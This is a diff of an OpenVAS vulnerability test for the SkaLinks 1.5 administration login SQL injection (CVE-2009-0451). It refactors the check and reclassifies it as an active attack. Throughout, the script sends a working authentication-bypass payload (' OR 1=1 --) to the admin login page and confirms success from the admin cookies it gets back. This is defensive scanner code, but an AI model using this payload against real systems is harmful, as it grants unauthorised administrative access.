@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: SkaLinks_1_5_administration_login_sql_injection.nasl 5148 2017-01-31 13:16:55Z teissa $
+# $Id: SkaLinks_1_5_administration_login_sql_injection.nasl 5770 2017-03-29 14:34:03Z cfi $
 #
 # SkaLinks Administration Login SQL Injection Vulnerability
 #
@@ -24,20 +24,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.100052");
- script_version("$Revision: 5148 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-31 14:16:55 +0100 (Tue, 31 Jan 2017) $");
+ script_version("$Revision: 5770 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 16:34:03 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-16 12:53:50 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-0451");
  script_bugtraq_id(33546);
-
  script_name("SkaLinks Administration Login SQL Injection Vulnerability");
-
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -64,42 +62,39 @@ include("http_keepalive.inc");
 port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
-host = http_host_name( port:port );
+foreach dir( make_list_unique( "/dir", "/skalinks", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/dir","/skalinks",cgi_dirs());
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/admin/index.php");
+  buf = http_get_cache(item:url, port:port);
+  if( buf == NULL )continue;
 
-    url = string(dir, "/admin/index.php");
-    req = http_get(item:url, port:port);
-    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if( buf == NULL )continue;
+  if( egrep(pattern: ".*Powered by <a [^>]+>SkaLinks.*", string: buf) ) {
 
-    if( egrep(pattern: ".*Powered by <a [^>]+>SkaLinks.*", string: buf) ) {
-	    variables = string("admin_name=1%27+OR+1%3D1+--+&admin_password=x&Login=Login");
-	    filename = string(dir + "/admin/index.php");
+    host = http_host_name( port:port );
 
-	    req = string(
-	      "POST ", filename, " HTTP/1.0\r\n", 
-	      "Referer: ","http://", host, filename, "\r\n",
-	      "Host: ", host, "\r\n", 
-	      "Content-Type: application/x-www-form-urlencoded\r\n", 
-	      "Content-Length: ", strlen(variables), 
-	      "\r\n\r\n", 
-	      variables
-	    );
+    variables = string("admin_name=1%27+OR+1%3D1+--+&admin_password=x&Login=Login");
+    url = string(dir + "/admin/index.php");
 
-	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-	    if( result == NULL )continue;
+    req = string(
+      "POST ", url, " HTTP/1.0\r\n", 
+      "Referer: ","http://", host, url, "\r\n",
+      "Host: ", host, "\r\n", 
+      "Content-Type: application/x-www-form-urlencoded\r\n", 
+      "Content-Length: ", strlen(variables), 
+      "\r\n\r\n", 
+      variables );
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+    if( res == NULL )continue;
 
-	    if(
-	       egrep(pattern: "^Set-Cookie: adminname=.*", string: result) &&
-	       egrep(pattern: "^Set-Cookie: pwd=", string: result) &&
-	       egrep(pattern: "^Location: http://.*/admin/", string: result) )
-	     {
-	         security_message(port:port);
-	         exit(0);
-	     }
+    if( egrep(pattern: "^Set-Cookie: adminname=.*", string: res) &&
+        egrep(pattern: "^Set-Cookie: pwd=", string: res) &&
+        egrep(pattern: "^Location: http://.*/admin/", string: res) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
+  }
 }
 
-exit(99);
+exit( 99 );
